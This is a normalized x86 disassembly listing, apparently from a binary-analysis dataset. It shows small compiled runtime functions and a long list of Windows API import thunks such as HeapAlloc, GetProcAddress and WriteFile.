mov ebp esp
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_421f62
xor eax eax
cmp [ ecx ] 0x9
sete al
retn
sub_421f6b
mov eax ecx
or [ eax ] 0xffffffff
retn
sub_421f71
mov eax ecx
mov [ eax ] r--data
retn
sub_421f7a
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov cl [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_421f91
xor eax eax
inc eax
retn
sub_421f95
mov al [ ecx + 0x4 ]
retn
sub_421f99
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop ebp
retn 0x8
mov cl [ ecx + 0x4 ]
mov [ eax ] cl
inc eax
sub_421fda
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx ]
sub_422007
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
pop ebp
jmp sub_421f13
sub_422045
mov eax [ ecx + 0x8 ]
retn
sub_422049
cmp [ ecx + 0x4 ] 0x1
setne al
dec al
and al 0x20
retn
sub_4220db
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
or [ eax + 0xc ] 0xffffffff
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_42216f
xor eax eax
cmp [ ecx ] al
je r-xdata
retn
inc eax
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
sub_422297
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx rwxdata
push [ ebp + 0x8 ]
call sub_421d93
pop ebp
retn
sub_422579
mov eax [ ecx + 0x8 ]
retn
sub_42257d
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
xor al al
retn
mov ecx [ ecx + 0x4 ]
mov al [ ecx + eax - 0x1 ]
retn
sub_42258f
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4222ae
add esp 0x10
pop ebp
retn 0x8
sub_422606
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42222c
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_4234e1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_422e20
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4234f7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_422e20
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_423ae5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42350d
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42466b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42459a
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_4262cf
mov edi edi
push ebp
mov ebp esp
push 0x2a
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4261d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4262ec
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4261d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_426309
mov edi edi
push ebp
mov ebp esp
push 0x26
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4261d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4263b7
push 0x5
call sub_415ff7
pop ecx
retn
sub_426451
push 0x5
call sub_415ff7
pop ecx
retn
sub_427147
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_427159
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_4271ec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetLocaleInfoW@IAT ]
pop ebp
retn
sub_4275d6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4173c0
sub_42773b
mov eax rwxdata
retn
sub_427741
mov eax rwxdata
retn
sub_427747
mov eax rwxdata
retn
sub_42774d
mov eax rwxdata
retn
sub_427753
mov edi edi
push ebp
mov ebp esp
call sub_42773b
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_427764
mov edi edi
push ebp
mov ebp esp
call sub_427741
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_427775
mov edi edi
push ebp
mov ebp esp
call sub_427747
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_427a32
push 0x7
call sub_415ff7
pop ecx
retn
sub_427ee1
push 0x6
call sub_415ff7
pop ecx
retn
sub_427eea
push 0x8
push r--data
call sub_40e30c
push 0x6
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_427786
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427f19
call sub_40e351
retn
sub_427f19
push 0x6
call sub_415ff7
pop ecx
retn
sub_427f5a
push 0x6
call sub_415ff7
pop ecx
retn
sub_4280c3
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_420c38
add esp 0xc
pop ebp
retn
sub_4280d9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_420c63
add esp 0x10
pop ebp
retn
sub_4280f2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4280c3
sub_4280fd
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4280d9
sub_428108
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_428dfc
add esp 0xc
pop ebp
retn
sub_42811e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_428e27
add esp 0x10
pop ebp
retn
sub_428265
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_428137
pop ebp
retn
sub_428516
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_428722
push [ rwxdata ]
call sub_40e714
pop ecx
retn
sub_42899e
push 0x7
call sub_415ff7
pop ecx
retn
sub_428a76
push 0x7
call sub_415ff7
pop ecx
retn
sub_428b5c
push 0x7
call sub_415ff7
pop ecx
retn
sub_428e27
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_428b65
add esp 0x14
pop ebp
retn
sub_428e70
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_428b65
add esp 0x14
pop ebp
retn
sub_428f7b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428e8d
add esp 0x10
pop ebp
retn
sub_429984
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4298c8
add esp 0xc
pop ebp
retn
GetLastError
jmp [ GetLastError@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
Sleep
jmp [ Sleep@IAT ]
FreeEnvironmentStringsA
jmp [ FreeEnvironmentStringsA@IAT ]
GetEnvironmentStrings
jmp [ GetEnvironmentStrings@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
FatalAppExitA
jmp [ FatalAppExitA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
WriteConsoleA
jmp [ WriteConsoleA@IAT ]
GetConsoleOutputCP
jmp [ GetConsoleOutputCP@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LCMapStringA
jmp [ LCMapStringA@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
GetStringTypeA
jmp [ GetStringTypeA@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetTimeFormatA
jmp [ GetTimeFormatA@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
EnumSystemLocalesA
jmp [ EnumSystemLocalesA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
GetTimeZoneInformation
jmp [ GetTimeZoneInformation@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
SetEnvironmentVariableA
jmp [ SetEnvironmentVariableA@IAT ]
sub_429c6c
mov [ rwxdata ] r--data
mov ecx rwxdata
jmp sub_410371
